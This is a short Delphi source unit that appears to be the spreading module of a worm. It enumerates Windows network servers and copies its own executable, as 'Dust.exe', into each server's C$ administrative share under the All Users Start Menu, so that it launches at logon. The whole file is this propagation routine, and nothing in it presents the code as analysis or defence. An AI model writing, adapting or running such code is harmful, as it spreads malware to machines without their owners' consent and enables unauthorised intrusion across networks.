   unit network;

   interface

   uses windows;

   var DOMAINS:STRING;
   procedure gonetwork;
   procedure Enumeration(aResource:PNetResource);
   implementation

   procedure Enumeration(aResource:PNetResource);
   var
      aHandle: THandle;
      k, BufferSize: DWORD;
      Buffer: array[0..1023] of TNetResource;
      i: Integer;
   begin
      WNetOpenEnum(2,0,0,aResource,aHandle);
      k:=1024;
      BufferSize:=SizeOf(Buffer);
      while WNetEnumResource(aHandle,k,@Buffer,BufferSize)=0 do
      for i:=0 to k-1 do
    begin
       if Buffer[i].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then
     DOMAINS := DOMAINS + copy(pchar(Buffer[i].lpRemoteName),3,MAX_PATH) + #13#10 ;
       if Buffer[i].dwUsage>0 then
     Enumeration(@Buffer[i])
    end;
      WNetCloseEnum(aHandle);
   end;

   procedure gonetwork;
   begin
    DOMAINS := '';
    Enumeration(nil);
    while(DOMAINS)<>'' do begin
     try                                                                      // c$\documents and settings\all users\start menu
      copyfile(pchar(paramstr(0)) ,pchar('\\'+ copy(domains,1,pos(#13#10,DOMAINS)-1)+ '\C$\documents and settings\all users\start menu\Dust.exe' ) , false );
      domains := copy(domains,pos(#13#10,domains)+2,length(domains));
     except
      domains := copy(domains,pos(#13#10,domains)+2,length(domains));
     end;
    end;
   end;

   end.
